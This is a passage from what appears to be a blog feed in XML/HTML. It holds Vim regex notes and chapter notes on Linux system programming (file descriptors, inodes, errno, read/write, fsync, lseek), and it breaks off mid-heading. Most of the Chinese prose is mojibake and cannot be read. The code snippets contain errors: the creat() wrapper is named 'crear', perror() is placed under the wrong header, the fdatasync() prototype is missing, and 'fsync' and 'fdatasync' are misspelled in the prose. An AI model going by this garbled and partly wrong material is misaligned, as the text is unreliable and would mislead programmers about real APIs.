æ–‡å­—ä¸ç¬¦å·</h2>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Practical Vim Notes</title>
    <link href="/2022/07/20/Practical-Vim-Notes/"/>
    <url>/2022/07/20/Practical-Vim-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬12ç« "><a href="#ç¬¬12ç« " class="headerlink" title="ç¬¬12ç« "></a>ç¬¬12ç« </h1><p><code>\c</code>ä¹‹å‰çš„æ¨¡å¼å¿½ç•¥å¤§å°å†™ã€‚</p><p><code>\x</code>ä»£è¡¨å®Œæ•´çš„å­—ç¬¦é›†[0-9a-fA-F]</p><p><code>&lt;</code>å’Œ<code>&gt;</code>ç”¨äºåŒ¹é…å•è¯çš„è¾¹ç•Œã€‚</p><p><code>\_s</code>åŒ¹é…ç©ºç™½å­—ç¬¦æˆ–æ¢è¡Œç¬¦ã€‚</p><p><code>%()</code>éæ•è·å‹æ‹¬å·ã€‚</p><p><code>\zs</code>æ ‡å¿—åŒ¹é…çš„èµ·å§‹ï¼Œ<code>\ze</code>æ ‡å¿—åŒ¹é…çš„ç»“æŸã€‚ç±»ä¼¼äºperlä¸­çš„ç¯è§†ã€‚</p><p>ä¸Perlæ­£åˆ™è¯­æ³•çš„å¯¹æ¯”<code>:h perl-patterns</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux System Programming</title>
    <link href="/2022/07/18/Linux-System-Programming/"/>
    <url>/2022/07/18/Linux-System-Programming/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -å…¥é—¨å’ŒåŸºæœ¬æ¦‚å¿µ"><a href="#ç¬¬ä¸€ç« -å…¥é—¨å’ŒåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ç¬¬ä¸€ç«  å…¥é—¨å’ŒåŸºæœ¬æ¦‚å¿µ"></a>ç¬¬ä¸€ç«  å…¥é—¨å’ŒåŸºæœ¬æ¦‚å¿µ</h1><h2 id="1-2-APIå’ŒABI"><a href="#1-2-APIå’ŒABI" class="headerlink" title="1.2 APIå’ŒABI"></a>1.2 APIå’ŒABI</h2><h3 id="1-2-2-ABI"><a href="#1-2-2-ABI" class="headerlink" title="1.2.2 ABI"></a>1.2.2 ABI</h3><p>ABIå’Œä½“ç³»ç»“æ„ç´§å¯†è”ç³»ï¼Œç»å¤§å¤šæ•°ABIè¡¨ç¤ºäº†æœºå™¨çº§æ¦‚å¿µ.</p><p>é€šå¸¸é€šè¿‡æœºå™¨ä½“ç³»ç»“æ„åç§°æ¥ç§°å‘¼è¿™äº›ABIï¼Œå¦‚Alphaæˆ–x86-64ã€‚</p><p>ABIæ˜¯æ“ä½œç³»ç»Ÿå’Œä½“ç³»ç»“æ„å…±åŒæä¾›çš„åŠŸèƒ½.</p><h2 id="1-4-Linuxç¼–ç¨‹çš„æ¦‚å¿µ"><a href="#1-4-Linuxç¼–ç¨‹çš„æ¦‚å¿µ" class="headerlink" title="1.4 Linuxç¼–ç¨‹çš„æ¦‚å¿µ"></a>1.4 Linuxç¼–ç¨‹çš„æ¦‚å¿µ</h2><h3 id="1-4-1-æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿ"><a href="#1-4-1-æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="1.4.1 æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿ"></a>1.4.1 æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿ</h3><p>åœ¨Linuxå†…æ ¸ä¸­ï¼Œæ–‡ä»¶ç”¨ä¸€ä¸ªæ•´æ•°è¡¨ç¤º(Cè¯­è¨€çš„intç±»å‹), ç§°æ–‡ä»¶æè¿°ç¬¦.</p><p>æ™®é€šæ–‡ä»¶åŒ…å«ä»¥å­—èŠ‚æµ(å³çº¿æ€§æ•°ç»„)ç»„ç»‡çš„æ•°æ®.</p><p>ç´¢å¼•èŠ‚ç‚¹inode(information node). åŒ…å«å’Œæ–‡ä»¶å…³è”çš„å…ƒæ•°æ®ï¼Œå…¶ä¸­åŒ…æ‹¬æ–‡ä»¶æ•°æ®åœ¨ç£ç›˜ä¸Šçš„å­˜å‚¨ä½ç½®.</p><p>ç´¢å¼•èŠ‚ç‚¹æ˜¯UNIXæ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„å®é™…ç‰©ç†å¯¹è±¡ï¼Œä¹Ÿæ˜¯åœ¨Linuxå†…æ ¸ä¸­é€šè¿‡æ•°æ®ç»“æ„è¡¨ç¤ºçš„æ¦‚å¿µå®ä½“.</p><h4 id="ç›®å½•å’Œé“¾æ¥"><a href="#ç›®å½•å’Œé“¾æ¥" class="headerlink" title="ç›®å½•å’Œé“¾æ¥"></a>ç›®å½•å’Œé“¾æ¥</h4><p>ç›®å½•æ˜¯å¯è¯»åç§°åˆ°ç´¢å¼•ç¼–å·ä¹‹é—´çš„æ˜ å°„.</p><p>åç§°å’Œç´¢å¼•èŠ‚ç‚¹ä¹‹é—´çš„é…å¯¹ç§°ä¸ºé“¾æ¥(link).</p><p>å¯ä»¥æŠŠç›®å½•çœ‹ä½œæ™®é€šçš„æ–‡ä»¶ï¼Œå…¶åŒºåˆ«åœ¨äºå®ƒåŒ…å«æ–‡ä»¶ååˆ°ç´¢å¼•èŠ‚ç‚¹çš„æ˜ å°„. å†…æ ¸1ç›´æ¥é€šè¿‡è¯¥æ˜ å°„æŠŠæ–‡ä»¶åè§£æä¸ºç´¢å¼•èŠ‚ç‚¹.</p><p>Linuxå†…æ ¸ä¹Ÿé‡‡ç”¨ç¼“å­˜(denty cache)å­˜å‚¨ç›®å½•çš„è§£æç»“æœï¼Œä»¥ä¾¿åç»­è®¿é—®æ›´å¿«åœ°æä¾›æŸ¥è¯¢ç»“æœ.</p><h4 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h4><p>å½“ä¸åŒåç§°çš„å¤šä¸ªé“¾æ¥æ˜ å°„åˆ°åŒä¸€ä¸ªç´¢å¼•èŠ‚ç‚¹æ—¶ï¼Œæˆ‘ä»¬ç§°è¯¥é“¾æ¥ä¸ºç¡¬é“¾æ¥(hard link).</p><p>æ¯ä¸ªç´¢å¼•èŠ‚ç‚¹åŒ…å«é“¾æ¥è®¡æ•°(link count)ï¼Œ è®°å½•è¯¥ç´¢å¼•èŠ‚ç‚¹åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„é“¾æ¥æ•°ï¼Œåªæœ‰å½“link count is 0, ç´¢å¼•èŠ‚ç‚¹åŠå…¶ç›¸å…³æ•°æ®æ‰ä¼šä»æ–‡ä»¶ç³»ç»Ÿä¸­çœŸæ­£åˆ é™¤ã€‚</p><h5 id="ç¬¦å·é“¾æ¥"><a href="#ç¬¦å·é“¾æ¥" class="headerlink" title="ç¬¦å·é“¾æ¥"></a>ç¬¦å·é“¾æ¥</h5><p>Symbolic links.</p><p>ä¸ºäº†å®ç°è·¨æ–‡ä»¶ç³»ç»Ÿé“¾æ¥ã€‚</p><p>æœ‰è‡ªå·±çš„ç´¢å¼•èŠ‚ç‚¹å’Œæ•°æ®å—.</p><h5 id="ç‰¹æ®Šæ–‡ä»¶"><a href="#ç‰¹æ®Šæ–‡ä»¶" class="headerlink" title="ç‰¹æ®Šæ–‡ä»¶"></a>ç‰¹æ®Šæ–‡ä»¶</h5><p>Special file. æŒ‡ä»¥æ–‡ä»¶æ¥è¡¨ç¤ºçš„å†…æ ¸å¯¹è±¡ã€‚ç‰¹æ®Šåº”è¯¥æ˜¯æŒ‡è®¿é—®æ–¹å¼ç‰¹æ®Š.</p><p>Linuxåªæ”¯æŒå››ç§special file:</p><pre><code class="hljs">1. å—è®¾å¤‡æ–‡ä»¶2. å­—ç¬¦è®¾å¤‡æ–‡ä»¶3. å‘½åç®¡é“4. UNIXåŸŸå¥—æ¥å­—</code></pre><p>å­—ç¬¦è®¾å¤‡ä½œä¸ºçº¿æ€§å­—èŠ‚é˜Ÿåˆ—æ¥è®¿é—®ã€‚</p><p>å—è®¾å¤‡ä½œä¸ºå­—èŠ‚æ•°ç»„æ¥è®¿é—®ã€‚</p><p>å‘½åç®¡é“(named pipes), é€šè¿‡FIFOç‰¹æ®Šæ–‡ä»¶æ¥è®¿é—®.</p><p>å¥—æ¥å­—(socket)ä½¿ç”¨socketæ–‡ä»¶è¿›è¡Œäº¤äº’.</p><h4 id="æ–‡ä»¶ç³»ç»Ÿå’Œå‘½åç©ºé—´"><a href="#æ–‡ä»¶ç³»ç»Ÿå’Œå‘½åç©ºé—´" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿå’Œå‘½åç©ºé—´"></a>æ–‡ä»¶ç³»ç»Ÿå’Œå‘½åç©ºé—´</h4><p>æœ‰äº›æ“ä½œç³»ç»Ÿä¼šæŠŠä¸åŒçš„ç£ç›˜å’Œé©±åŠ¨åˆ’åˆ†ä¸ºç‹¬ç«‹çš„å‘½åç©ºé—´ã€‚<br>æ·»åŠ å’Œåˆ é™¤æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œä¸ºæŒ‚è½½(mounting)å’Œå¸è½½(unmounting).</p><p>Linuxç³»ç»Ÿå¿…å®šæœ‰ä¸ªæ ¹æ–‡ä»¶ç³»ç»Ÿ.</p><p>å—è®¾å¤‡çš„æœ€å°å¯»å€å•ä½æ˜¯æ‰‡åŒº(sector).</p><p>æ–‡ä»¶ç³»ç»Ÿä¸­çš„æœ€å°é€»è¾‘å¯»å€å•å…ƒæ˜¯å—(block), å…¶å¤§å°ä¸€èˆ¬æ˜¯2çš„æŒ‡æ•°å€ä¹˜ä»¥æ‰‡åŒºå¤§å°ã€‚</p><p>é¡µ(page)æ˜¯å†…å­˜çš„æœ€å°å¯»å€å•å…ƒ.</p><h3 id="1-4-2-è¿›ç¨‹"><a href="#1-4-2-è¿›ç¨‹" class="headerlink" title="1.4.2 è¿›ç¨‹"></a>1.4.2 è¿›ç¨‹</h3><p>è¿›ç¨‹ä¸ä»…åŒ…å«ç›®æ ‡ä»£ç ï¼Œå®ƒè¿˜åŒ…æ‹¬æ•°æ®ã€èµ„æºã€çŠ¶æ€å’Œè™šæ‹Ÿè®¡ç®—æœºã€‚</p><p>åœ¨Linuxä¸‹ï¼Œæœ€å¸¸è§çš„æ ¼å¼ç§°â€å¯æ‰§è¡Œå’Œå¯é“¾æ¥çš„æ ¼å¼(Executable and Linkable Format, ELF)â€.</p><p>Cæ ‡å‡†è§„å®šäº†Cå˜é‡çš„é»˜è®¤å€¼ä¸º0.</p><p>bssçš„å–åå­˜åœ¨å†å²é—ç•™åŸå› ï¼Œæ˜¯block started by symbol.</p><p>è¿›ç¨‹èµ„æºä»¥åŠè¯¥è¿›ç¨‹ç›¸å…³çš„æ•°æ®å’Œç»Ÿè®¡ä¿å­˜åœ¨å†…æ ¸ä¸­è¯¥è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦ä¸­.</p><h4 id="è¿›ç¨‹å±‚æ¬¡ç»“æ„"><a href="#è¿›ç¨‹å±‚æ¬¡ç»“æ„" class="headerlink" title="è¿›ç¨‹å±‚æ¬¡ç»“æ„"></a>è¿›ç¨‹å±‚æ¬¡ç»“æ„</h4><p>åœ¨Linuxä¸­ï¼Œè¿›ç¨‹æ ‘çš„æ ¹æ˜¯ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œç§°ä¸ºinitè¿›ç¨‹ï¼Œé€šå¸¸ä¸ºinitç¨‹åºã€‚</p><p>å¦‚æœçˆ¶è¿›ç¨‹å…ˆäºå­è¿›ç¨‹ç»ˆæ­¢ï¼Œå†…æ ¸ä¼šå°†initè¿›ç¨‹æŒ‡å®šä¸ºå®ƒçš„çˆ¶è¿›ç¨‹ã€‚</p><p>åœ¨Linuxå†…æ ¸ä¸­ï¼Œuidæ˜¯ç”¨æˆ·çš„å”¯ä¸€æ ‡è¯†.</p><h3 id="1-4-4-æƒé™"><a href="#1-4-4-æƒé™" class="headerlink" title="1.4.4 æƒé™"></a>1.4.4 æƒé™</h3><p>ç‰¹æ®Šæ–‡ä»¶å¿½ç•¥æ‰§è¡Œæƒé™.</p><p>å¯¹äºç›®å½•ï¼Œè¯»æƒé™è¡¨ç¤ºå…è®¸åˆ—å‡ºç›®å½•çš„å†…å®¹ï¼Œå†™æƒé™è¡¨ç¤ºå…è®¸åœ¨ç›®å½•ä¸­æ·»åŠ æ–°çš„é“¾æ¥ï¼Œæ‰§è¡Œæƒé™è¡¨ç¤ºå…è®¸åœ¨è·¯å¾„ä¸­è¾“å…¥å’Œä½¿ç”¨è¯¥ç›®å½•.</p><h3 id="1-4-5-ä¿¡å·"><a href="#1-4-5-ä¿¡å·" class="headerlink" title="1.4.5 ä¿¡å·"></a>1.4.5 ä¿¡å·</h3><p>ä¿¡å·ä¸€èˆ¬ç”¨äºé€šçŸ¥è¿›ç¨‹å‘ç”Ÿäº†æŸäº›äº‹ä»¶ï¼Œå¦‚æ®µé”™è¯¯æˆ–ç”¨æˆ·æŒ‰ä¸‹Ctrl+Cã€‚</p><p>æ¯ä¸ªä¿¡å·æ˜¯ç”±ä¸€ä¸ªæ•°å€¼å¸¸é‡å’Œæ–‡æœ¬åè¡¨ç¤ºã€‚å¦‚SIGHUPç”¨äºè¡¨ç¤ºç»ˆç«¯æŒ‚èµ·ï¼Œåœ¨x86-64ä½“ç³»ç»“æ„ä¸Šå€¼ä¸º1.</p><h3 id="1-4-6-è¿›ç¨‹é—´é€šä¿¡"><a href="#1-4-6-è¿›ç¨‹é—´é€šä¿¡" class="headerlink" title="1.4.6 è¿›ç¨‹é—´é€šä¿¡"></a>1.4.6 è¿›ç¨‹é—´é€šä¿¡</h3><p>Linuxæ”¯æŒçš„è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶åŒ…æ‹¬ç®¡é“ï¼Œå‘½åç®¡é“ï¼Œä¿¡å·é‡ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå…±äº«å†…å­˜å’Œå¿«é€Ÿç”¨æˆ·ç©ºé—´äº’æ–¥ã€‚</p><h3 id="1-4-8-Error-Handling"><a href="#1-4-8-Error-Handling" class="headerlink" title="1.4.8 Error Handling"></a>1.4.8 Error Handling</h3><p>Special variableï¼Œerrno.</p><p>å‡½æ•°é€šè¿‡ç‰¹æ®Šè¿”å›å€¼(é€šå¸¸ä¸º1)æ¥é€šçŸ¥å‡½æ•°è°ƒç”¨å‘ç”Ÿé”™è¯¯.</p><p>å˜é‡errnoç”¨äºå®šä½é”™è¯¯çš„åŸå› ã€‚</p><p>errnoå®šä¹‰åœ¨&lt;errno.h&gt;.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> errno;<br></code></pre></td></tr></table></figure><h4 id="æŠŠerrnoå€¼è½¬åŒ–ä¸ºå¯¹åº”çš„æ–‡æœ¬"><a href="#æŠŠerrnoå€¼è½¬åŒ–ä¸ºå¯¹åº”çš„æ–‡æœ¬" class="headerlink" title="æŠŠerrnoå€¼è½¬åŒ–ä¸ºå¯¹åº”çš„æ–‡æœ¬"></a>æŠŠerrnoå€¼è½¬åŒ–ä¸ºå¯¹åº”çš„æ–‡æœ¬</h4><p>Using the function <code>perror()</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">perror</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span></span>;<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-2-File-I-x2F-O"><a href="#CHAPTER-2-File-I-x2F-O" class="headerlink" title="CHAPTER 2 File I&#x2F;O"></a>CHAPTER 2 File I&#x2F;O</h1><p>æœ€ç®€å•åŠæœ€å¸¸è§çš„æ–‡ä»¶äº¤äº’æ–¹å¼â€“ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å†…æ ¸ä¼šä¸ºæ¯ä¸ªè¿›ç¨‹ç»´æŠ¤ä¸€ä¸ªæ‰“å¼€æ–‡ä»¶çš„åˆ—è¡¨ï¼Œç§°æ–‡ä»¶è¡¨(file table)</p><p>æ¯ä¸ªLinuxè¿›ç¨‹å¯è¾¾å¼€å¾—æ–‡ä»¶æ•°æ˜¯æœ‰ä¸Šé™çš„.</p><p>æ¯ä¸ªè¿›ç¨‹è‡³å°‘åŒ…æ‹¬ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦: 0, 1, 2</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">0</span>è¡¨ç¤º<span class="hljs-keyword">stdin</span><br><span class="hljs-number">1</span>è¡¨ç¤º<span class="hljs-keyword">stdout</span><br><span class="hljs-number">2</span>è¡¨ç¤º<span class="hljs-keyword">stderr</span><br></code></pre></td></tr></table></figure><p>å‡ ä¹ä»»ä½•èƒ½å¤Ÿè¯»å†™çš„ä¸œè¥¿éƒ½å¯ä»¥é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ¥è®¿é—®.</p><p>å…³äºæ–‡ä»¶çš„è¯»å†™éƒ½è¦åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚</p><h3 id="2-1-2-æ–°å»ºæ–‡ä»¶çš„æ‰€æœ‰è€…"><a href="#2-1-2-æ–°å»ºæ–‡ä»¶çš„æ‰€æœ‰è€…" class="headerlink" title="2.1.2 æ–°å»ºæ–‡ä»¶çš„æ‰€æœ‰è€…"></a>2.1.2 æ–°å»ºæ–‡ä»¶çš„æ‰€æœ‰è€…</h3><p>æ–‡ä»¶æ‰€æœ‰è€…çš„uidå³åˆ›å»ºè¯¥æ–‡ä»¶çš„è¿›ç¨‹çš„æœ‰æ•ˆuid.</p><p>æ–‡ä»¶æ‰€å±ç»„é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨åˆ›å»ºè¿›ç¨‹çš„æœ‰æ•ˆgid.</p><h3 id="2-1-3-æ–‡ä»¶æƒé™"><a href="#2-1-3-æ–‡ä»¶æƒé™" class="headerlink" title="2.1.3 æ–‡ä»¶æƒé™"></a>2.1.3 æ–‡ä»¶æƒé™</h3><p>åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œå‚æ•°modeæä¾›äº†æ–°å»ºæ–‡ä»¶çš„æƒé™.</p><h3 id="The-creat-function"><a href="#The-creat-function" class="headerlink" title="The creat() function"></a>The creat() function</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">crear</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">int</span> mode)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">open</span> <span class="hljs-params">(name, O_WRONLY | O_CREAT | O_TRUNC, mode)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æ•°æ®å¯è¯»å’Œåˆ°è¾¾æ•°æ®ç»“å°¾æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µã€‚</p><h3 id="Reading-All-the-Bytes"><a href="#Reading-All-the-Bytes" class="headerlink" title="Reading All the Bytes"></a>Reading All the Bytes</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata">ssize_t <span class="hljs-keyword">ret</span>;<br><br><span class="hljs-keyword">while</span> (len != 0 &amp;&amp; (<span class="hljs-keyword">ret</span> = <span class="hljs-keyword">read</span> (fd, buf, len)) != 0) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">ret</span> == -1) &#123;<br>                <span class="hljs-keyword">if</span> (errno == EINTR)<br>                        <span class="hljs-keyword">continue</span>;<br>                perror (<span class="hljs-string">&quot;read&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        len -= <span class="hljs-keyword">ret</span>;<br>        buf += <span class="hljs-keyword">ret</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-3-Nonblocking-Reads"><a href="#2-2-3-Nonblocking-Reads" class="headerlink" title="2.2.3 Nonblocking Reads"></a>2.2.3 Nonblocking Reads</h3><p>å½“ä»¥éé˜»å¡æ¨¡å¼è¯»æ–‡ä»¶æ—¶ï¼Œå¿…é¡»æ£€æŸ¥<code>EAGAIN</code>, å¦åˆ™å¯èƒ½å› ä¸ºä¸¢å¤±æ•°æ®å¯¼è‡´ä¸¥é‡åæœ.</p><h3 id="2-2-5-read-è°ƒç”¨çš„å¤§å°é™åˆ¶"><a href="#2-2-5-read-è°ƒç”¨çš„å¤§å°é™åˆ¶" class="headerlink" title="2.2.5 read()è°ƒç”¨çš„å¤§å°é™åˆ¶"></a>2.2.5 read()è°ƒç”¨çš„å¤§å°é™åˆ¶</h3><p>åœ¨32ä½ç³»ç»Ÿä¸Šï¼Œsize_tå’Œssize_tå¯¹åº”çš„Cç±»å‹é€šå¸¸æ˜¯unsigned intå’Œint.</p><h2 id="2-3-Writing-with-write"><a href="#2-3-Writing-with-write" class="headerlink" title="2.3 Writing with write()"></a>2.3 Writing with write()</h2><h3 id="2-3-6-write-è¡Œä¸º"><a href="#2-3-6-write-è¡Œä¸º" class="headerlink" title="2.3.6 write()è¡Œä¸º"></a>2.3.6 write()è¡Œä¸º</h3><p>å†…æ ¸æŠŠå†™æ“ä½œæ¨è¿Ÿåˆ°ç³»ç»Ÿç©ºé—²æ—¶æœŸï¼Œæ‰¹å¤„ç†å¾ˆå¤šå†™æ“ä½œï¼Œç§°å»¶è¿Ÿå†™.</p><p>ä¸ºäº†ä¿è¯æ•°æ®æŒ‰æ—¶å†™å…¥ï¼Œå†…æ ¸è®¾ç½®äº†â€æœ€å¤§ç¼“å­˜æ—¶æ•ˆ(maximum buffer age)â€</p><h2 id="2-4-åŒæ­¥I-x2F-O"><a href="#2-4-åŒæ­¥I-x2F-O" class="headerlink" title="2.4 åŒæ­¥I&#x2F;O"></a>2.4 åŒæ­¥I&#x2F;O</h2><p>ç‰ºç‰²æ€§èƒ½æ¢æ¥åŒæ­¥æ“ä½œï¼Œæ§åˆ¶æ•°æ®ä½•æ—¶å†™åˆ°ç£ç›˜ã€‚</p><h3 id="2-4-1-fsync-and-fdatasync"><a href="#2-4-1-fsync-and-fdatasync" class="headerlink" title="2.4.1 fsync() and fdatasync()"></a>2.4.1 fsync() and fdatasync()</h3><p>fsync():</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fsync</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span></span>;<br></code></pre></td></tr></table></figure><p>fdatasync():</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸èƒ½ä¿è¯å·²ç»æ›´æ–°çš„åŒ…å«è¯¥æ–‡ä»¶çš„ç›®å½•é¡¹ä¼šåŒæ­¥åˆ°ç£ç›˜ä¸Š. ä¸ºäº†ä¿è¯1å¯¹ç›®å½•é¡¹çš„æ›´æ–°ä¹Ÿéƒ½åŒæ­¥åˆ°ç£ç›˜ä¸Šï¼Œå¿…é¡»å¯¹æ–‡ä»¶ç›®å½•ä¹Ÿè°ƒç”¨<code>fsync()</code>è¿›è¡ŒåŒæ­¥ã€‚</p><p>è¿”å›å€¼å’Œé”™è¯¯ç ï¼ŒåŒæ—¶è®¾ç½®<code>errno</code>çš„å€¼ã€‚</p><p>åœ¨POSIXæ ‡å‡†ä¸­ï¼Œfysnc()æ˜¯å¿…è¦çš„ï¼Œè€Œfdarasync()æ˜¯å¯é€‰çš„ã€‚</p><h3 id="2-4-2-sync"><a href="#2-4-2-sync" class="headerlink" title="2.4.2 sync()"></a>2.4.2 sync()</h3><p><code>sync()</code>ç³»ç»Ÿè°ƒç”¨ç”¨æ¥å¯¹ç£ç›˜ä¸Šçš„æ‰€æœ‰ç¼“å†²åŒºè¿›è¡ŒåŒæ­¥ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sync</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>å…³äºåŒæ­¥æ—¶æ³¨æ„æ•°æ®å’Œå…ƒæ•°æ®æ˜¯å¦éƒ½å†™å…¥ã€‚</p><h3 id="2-4-3-O-SYNCæ ‡å¿—ä½"><a href="#2-4-3-O-SYNCæ ‡å¿—ä½" class="headerlink" title="2.4.3 O_SYNCæ ‡å¿—ä½"></a>2.4.3 O_SYNCæ ‡å¿—ä½</h3><p>ç³»ç»Ÿè°ƒç”¨open()å¯ä»¥ä½¿ç”¨O_SYNCæ ‡å¿—ä½ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶çš„æ‰€æœ‰I&#x2F;Oæ“ä½œéƒ½éœ€è¦åŒæ­¥ã€‚</p><h2 id="2-6-å…³é—­æ–‡ä»¶"><a href="#2-6-å…³é—­æ–‡ä»¶" class="headerlink" title="2.6 å…³é—­æ–‡ä»¶"></a>2.6 å…³é—­æ–‡ä»¶</h2><p>ç³»ç»Ÿè°ƒç”¨<code>close()</code>ä¼šå–æ¶ˆå½“å‰è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦fdä¸å…¶å…³è”çš„æ–‡ä»¶ä¹‹é—´çš„æ˜ å°„ã€‚</p><p>å…³é—­æ–‡ä»¶æ“ä½œå¹¶éæ„å‘³ç€è¯¥æ–‡ä»¶çš„æ•°æ®å·²ç»è¢«å†™åˆ°ç£ç›˜ã€‚</p><p>å½“å…³é—­æŒ‡å‘æŸä¸ªæ–‡ä»¶çš„æœ€åä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œå†…æ ¸ä¸­è¡¨ç¤ºè¯¥æ–‡ä»¶çš„æ•°æ®ç»“æ„å°±é‡Šæ”¾äº†ã€‚</p><h2 id="2-7-ç”¨lseek-æŸ¥æ‰¾"><a href="#2-7-ç”¨lseek-æŸ¥æ‰¾" class="headerlink" title="2.7 ç”¨lseek()æŸ¥æ‰¾"></a>2.7 ç”¨lseek()æŸ¥æ‰¾</h2><p>è®¾ç½®æ–‡ä»¶ä½ç½®, åº”è¯¥å°±æ˜¯æ–‡ä»¶æ“ä½œçš„ä½ç½®.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">off_t</span> <span class="hljs-title">lseek</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> pos, <span class="hljs-type">int</span> origin)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="2-7-1-åœ¨æ–‡ä»¶æœ«å°¾åæŸ¥æ‰¾"><a href="#2-7-1-åœ¨æ–‡ä»¶æœ«å°¾åæŸ¥æ‰¾" class="headerlink" title="2.7.1 åœ¨æ–‡ä»¶æœ«å°¾åæŸ¥æ‰¾"></a>2.7.1 åœ¨æ–‡ä»¶æœ«å°¾åæŸ¥æ‰¾</h3><p>åœ¨UNIXæ–‡ä»¶ç³»ç»Ÿä¸Šï¼Œç©ºæ´ä¸å ç”¨ä»»ä½•ç‰©ç†ç£ç›˜ç©ºé—´ã€‚</p><h2 id="2-8-å®šä½è¯»å†™"><a href="#2-8-å®šä½è¯»å†™" class="headerlink" title="2.8 å®šä½è¯»å†™"></a>2.8 